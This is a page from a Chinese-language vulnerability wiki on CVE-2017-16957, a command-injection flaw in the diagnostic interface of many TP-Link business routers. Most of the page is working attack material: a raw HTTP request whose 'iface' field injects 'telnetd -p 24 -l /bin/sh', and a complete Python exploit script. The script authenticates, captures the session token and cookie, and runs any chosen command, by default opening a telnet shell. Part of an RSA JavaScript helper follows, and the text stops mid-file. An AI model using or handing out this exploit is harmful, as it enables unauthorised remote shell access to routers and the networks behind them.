<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/IOT%E5%AE%89%E5%85%A8/TP-Link/%EF%BC%88CVE-2017-16957%EF%BC%89TP-Link%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE 2017 16957）TP Link 命令注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_top", children: [
          ]},
          {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2", children: [
          ]},
          {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3", children: [
              {title: "\u6f0f\u6d1e\u811a\u672c", url: "#_4" },
              {title: "RSA_Encryption_For_Tplink.js \u6587\u4ef6", url: "#rsa_encryption_for_tplinkjs" },
          ]},
          {title: "\u56db\u3001\u53c2\u8003\u94fe\u63a5", url: "#_5", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-9374%EF%BC%89TP-Link%20TL-WR849N%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-9374%EF%BC%89TP-Link%20TL-WR849N%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-9374）TP-Link TL-WR849N 远程命令执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../TOTOLink/TOTOLink%20%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87%20download.cgi%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25084/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../TOTOLink/TOTOLink%20%E5%A4%9A%E4%B8%AA%E8%AE%BE%E5%A4%87%20download.cgi%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2022-25084/" class="btn btn-xs btn-link">
        TOTOLink 多个设备 download.cgi 远程命令执行漏洞 CVE-2022-25084
      </a>
    </div>
    
  </div>

    

    <h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>TP-Link TL-WVR等都是中国普联（TP-LINK）公司的无线路由器产品。</p>
<p>多款TP-Link产品中存在命令注入漏洞。远程攻击者可通过向cgi-bin/luci发送face字段中带有shell元字符的admin/diagnostic命令利用该漏洞执行任意命令。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>TP-LINK TL-WVR TP-LINK TL-WVR300 v4 TP-LINK TL-WVR302 v2 TP-LINK TL-WVR450 TP-LINK TL-WVR450L TP-LINK TL-WVR450G v5 TP-LINK TL-WVR458 TP-LINK TL-WVR458L TP-LINK TL-WVR458P TP-LINK TL-WVR900G v3 TP-LINK TL-WVR1200L TP-LINK TL-WVR900L TP-LINK TL-WVR1300L TP-LINK TL-WVR1300G TP-LINK TL-WVR1750L TP-LINK TL-WVR2600L TP-LINK TL-WVR4300L TP-LINK TL-WAR450 TP-LINK TL-WAR302 TP-LINK TL-WAR2600L TP-LINK TL-WAR1750L TP-LINK TL-WAR1300L TP-LINK TL-WAR1200L TP-LINK TL-WAR900L TP-LINK TL-WAR458 TP-LINK TL-WAR450L TP-LINK TL-ER5510G v2 TP-LINK TL-ER5510G v3 TP-LINK TL-ER5520G v2 TP-LINK TL-ER5520G v3 TP-LINK TL-ER6120G v2 TP-LINK TL-ER6520G v2 TP-LINK TL-ER6520G v3 TP-LINK TL-ER3210G TP-LINK TL-ER7520G TP-LINK TL-ER6520G TP-LINK TL-ER6510G TP-LINK TL-ER6220G TP-LINK TL-ER6120G TP-LINK TL-ER6110G TP-LINK TL-ER5120G TP-LINK TL-ER5110G TP-LINK TL-ER3220G TP-LINK TL-R479P-AC TP-LINK TL-R478G+ TP-LINK TL-R478G TP-LINK TL-R478+ TP-LINK TL-R478 TP-LINK TL-R473GP-AC TP-LINK TL-R473P-AC TP-LINK TL-R473G TP-LINK TL-R473 TP-LINK TL-R4299G TP-LINK TL-R4239G TP-LINK TL-R4149G TP-LINK TL-R488 TP-LINK TL-R483 TP-LINK TL-R483G TP-LINK TL-R479GP-AC TP-LINK TL-R479GPE-AC</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>POST /cgi-bin/luci/;stok=ea2178b4514da7ae227f4ec192536930/admin/diagnostic?form=diag HTTP/1.1
Host: 0-sec.org
Content-Length: 370
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.3.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.3.1/webpages/index.html
Accept-Encoding: gzip, deflate
Cookie: sysauth=be9b6f2b4b9a76a8a658e108c6197f2c
Connection: close

data=%7B%22method%22%3A%22start%22%2C%22params%22%3A%7B%22type%22%3A%220%22%2C%22type_hidden%22%3A%220%22%2C%22ipaddr_ping%22%3A%22baidu.com%22%2C%22iface_ping%22%3A%22WAN1%22%2C%22ipaddr%22%3A%22baidu.com%22%2C%22iface%22%3A%22%3Btelnetd+-p+24+-l+/bin/sh%22%2C%22count%22%3A%221%22%2C%22pktsize%22%3A%2264%22%2C%22my_result%22%3A%22The+Router+is+ready.%5Cr%5Cn%22%7D%7D
</code></pre></div>
<h3 id="_4">漏洞脚本<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Tested product: TL-WVR450L</span>
<span class="c1"># Hardware version：V1.0</span>
<span class="c1"># Firmware version: 20161125</span>
<span class="c1"># The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager.</span>
<span class="c1"># You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">execjs</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib</span>


<span class="k">def</span><span class="w"> </span><span class="nf">read_js</span><span class="p">():</span>
    <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;./RSA_Encryption_For_Tplink.js&quot;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
    <span class="n">line</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
    <span class="n">js</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="k">while</span> <span class="n">line</span><span class="p">:</span>
        <span class="n">js</span> <span class="o">=</span> <span class="n">js</span> <span class="o">+</span> <span class="n">line</span>
        <span class="n">line</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
    <span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">js</span>


<span class="k">def</span><span class="w"> </span><span class="nf">execute</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>


        <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;http://</span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;http://</span><span class="si">{}</span><span class="s1">/webpages/login.html&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&quot;method&quot;</span><span class="p">:</span><span class="s2">&quot;get&quot;</span>
        <span class="p">}</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="s1">&#39;/cgi-bin/luci/;stok=/login?form=login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)}),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
        <span class="n">rsa_public_n</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ret</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;result&#39;</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
        <span class="n">rsa_public_e</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ret</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;result&#39;</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
        <span class="n">js</span> <span class="o">=</span> <span class="n">read_js</span><span class="p">()</span>
        <span class="n">js_handle</span> <span class="o">=</span> <span class="n">execjs</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="n">js</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">js_handle</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="s1">&#39;MainEncrypt&#39;</span><span class="p">,</span> <span class="n">rsa_public_n</span><span class="p">,</span> <span class="n">rsa_public_e</span><span class="p">,</span> <span class="n">passwd</span><span class="p">)</span>


        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&quot;method&quot;</span><span class="p">:</span><span class="s2">&quot;login&quot;</span><span class="p">,</span>
            <span class="s2">&quot;params&quot;</span><span class="p">:{</span>
                <span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="s2">&quot;</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">),</span>
                <span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="s2">&quot;</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="s1">&#39;/cgi-bin/luci/;stok=/login?form=login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)}),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
        <span class="n">stok</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ret</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="s1">&#39;result&#39;</span><span class="p">][</span><span class="s1">&#39;stok&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
        <span class="n">cookie</span> <span class="o">=</span> <span class="n">ret</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">]</span>


        <span class="nb">print</span> <span class="s1">&#39;[+] Login success&#39;</span>
        <span class="nb">print</span> <span class="s1">&#39;[+] Get The Token: &#39;</span> <span class="o">+</span> <span class="n">stok</span>
        <span class="nb">print</span> <span class="s1">&#39;[+] Get The Cookie: &#39;</span> <span class="o">+</span> <span class="n">cookie</span>


        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span><span class="s1">&#39;application/x-www-form-urlencoded; charset=UTF-8&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Referer&#39;</span><span class="p">:</span><span class="s1">&#39;http://</span><span class="si">{}</span><span class="s1">/webpages/login.html&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ip</span><span class="p">),</span>
            <span class="s1">&#39;Cookie&#39;</span><span class="p">:</span><span class="s1">&#39;</span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">&quot;method&quot;</span><span class="p">:</span><span class="s2">&quot;start&quot;</span><span class="p">,</span>
            <span class="s2">&quot;params&quot;</span><span class="p">:{</span>
                <span class="s2">&quot;type&quot;</span><span class="p">:</span><span class="s2">&quot;0&quot;</span><span class="p">,</span>
                <span class="s2">&quot;type_hidden&quot;</span><span class="p">:</span><span class="s2">&quot;0&quot;</span><span class="p">,</span>
                <span class="s2">&quot;ipaddr_ping&quot;</span><span class="p">:</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
                <span class="s2">&quot;iface_ping&quot;</span><span class="p">:</span><span class="s2">&quot;WAN1&quot;</span><span class="p">,</span>
                <span class="s2">&quot;ipaddr&quot;</span><span class="p">:</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
                <span class="s2">&quot;iface&quot;</span><span class="p">:</span><span class="s2">&quot;;</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span>
                <span class="s2">&quot;count&quot;</span><span class="p">:</span><span class="s2">&quot;1&quot;</span><span class="p">,</span>
                <span class="s2">&quot;pktsize&quot;</span><span class="p">:</span><span class="s2">&quot;64&quot;</span><span class="p">,</span>
                <span class="s2">&quot;my_result&quot;</span><span class="p">:</span><span class="s2">&quot;exploit&quot;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="s1">&#39;/cgi-bin/luci/;stok=</span><span class="si">{}</span><span class="s1">/admin/diagnostic?form=diag&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">stok</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">({</span><span class="s2">&quot;data&quot;</span><span class="p">:</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">)}),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>


        <span class="c1">#print ret.text</span>
        <span class="nb">print</span> <span class="s1">&#39;[+] Finish RCE&#39;</span>
        <span class="nb">print</span> <span class="s1">&#39;--------------------------------------------------------------&#39;</span>
        <span class="k">return</span> <span class="kc">True</span>

    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="kc">False</span>


<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="nb">print</span> <span class="s1">&#39;-----------Tplink LUCI diagnostic Authenticated RCE-----------&#39;</span>
    <span class="nb">print</span> <span class="n">execute</span><span class="p">(</span><span class="s1">&#39;192.168.1.1&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;telnetd -p 24 -l /bin/sh&#39;</span><span class="p">)</span>
</code></pre></div>
<h3 id="rsa_encryption_for_tplinkjs">RSA_Encryption_For_Tplink.js 文件<a class="headerlink" href="#rsa_encryption_for_tplinkjs" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">// Copyright (c) 2005  Tom Wu</span>
<span class="c1">// All Rights Reserved.</span>
<span class="c1">// See &quot;LICENSE&quot; for details.</span>

<span class="c1">// Basic JavaScript BN library - subset useful for RSA encryption.</span>

<span class="c1">// Bits per digit</span>

<span class="c1">// JavaScript engine analysis</span>


<span class="kd">var</span><span class="w"> </span><span class="nx">BI_RC</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Array</span><span class="p">();</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">BI_RM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">dbits</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">canary</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xdeadbeefcafe</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">j_lm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="nx">canary</span><span class="o">&amp;</span><span class="mh">0xffffff</span><span class="p">)</span><span class="o">==</span><span class="mh">0xefcafe</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">rng_psize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">256</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">rng_state</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">rng_pool</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">rng_pptr</span><span class="p">;</span>
<span class="c1">// Initialize the pool with junk if needed.</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">am</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">am2</span><span class="p">;</span>
<span class="nx">dbits</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">30</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">DB</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">dbits</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">DM</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="nx">dbits</span><span class="p">)</span><span class="o">-</span><span class="mf">1</span><span class="p">);</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">DV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="o">&lt;&lt;</span><span class="nx">dbits</span><span class="p">);</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">BI_FP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">52</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">FV</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">pow</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="nx">BI_FP</span><span class="p">);</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">F1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">BI_FP</span><span class="o">-</span><span class="nx">dbits</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">F2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="o">*</span><span class="nx">dbits</span><span class="o">-</span><span class="nx">BI_FP</span><span class="p">;</span>
<span class="c1">// protected</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">copyTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpCopyTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">fromInt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpFromInt</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">fromString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpFromString</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">clamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpClamp</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">dlShiftTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpDLShiftTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">drShiftTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpDRShiftTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">lShiftTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpLShiftTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">rShiftTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpRShiftTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">subTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpSubTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">multiplyTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpMultiplyTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">squareTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpSquareTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">divRemTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpDivRemTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">invDigit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpInvDigit</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">isEven</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpIsEven</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">exp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnpExp</span><span class="p">;</span>
<span class="c1">// public</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnToString</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">negate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnNegate</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">abs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnAbs</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">compareTo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnCompareTo</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">bitLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnBitLength</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">mod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnMod</span><span class="p">;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">modPowInt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bnModPowInt</span><span class="p">;</span>
<span class="c1">// &quot;constants&quot;</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ZERO</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbv</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
<span class="nx">BigInteger</span><span class="p">.</span><span class="nx">ONE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nbv</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
<span class="c1">// Digit conversions</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">rr</span><span class="p">,</span><span class="nx">vv</span><span class="p">;</span>
<span class="nx">rr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
